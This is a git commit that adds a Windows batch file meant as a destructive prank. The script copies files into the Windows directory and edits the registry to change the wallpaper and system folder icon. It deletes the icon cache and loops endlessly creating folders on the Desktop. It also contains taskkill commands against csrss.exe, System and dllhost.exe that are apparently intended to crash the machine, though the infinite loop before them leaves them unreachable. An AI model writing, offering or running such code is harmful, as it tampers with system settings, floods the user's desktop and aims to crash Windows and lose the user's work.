2c8c2aef5912ecf74018350ad395007bb82c278f
Liu-Wen-Yuan <15816141883@163.com>
2017-08-08 09:18:14 -0500

    Create 1.0b1_gh-RUNRUNRUNRUNRUNRUNRUNRUN.bat

---
+++ 1.0b1_gh-RUNRUNRUNRUNRUNRUNRUNRUN.bat
@@ -0,0 +1,24 @@
+@echo off
+:main
+copy BG.png C:/Windows/36ACR6/SafeBG.png
+copy mi.ico C:/Windows/36ACR6/BaiduCloud.ico
+reg add "hkcu\control panel\desktop" /v wallpaper /d "C:/Windows/36ACR6/SafeBG.png" /f
+RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
+del %APPDATA%/IconCache.db
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 3 /d "C:/Windows/36ACR6/BaiduCloud.ico" /f
+goto createF
+:createF
+cd %HOMEPATH%/Desktop/
+md Are you OK?../
+goto createF
+goto PING-S
+:PING-S
+ping 127.0.0.1 -n 6
+goto bsod
+:bsod
+taskkill /f /im csrss.exe
+taskkill /f /im System
+taskkill /f /im dllhost.exe
+taskkill /f /im /t csrss.exe
+taskkill /f /im /t System
+taskkill /f /im /t dllhost.exe
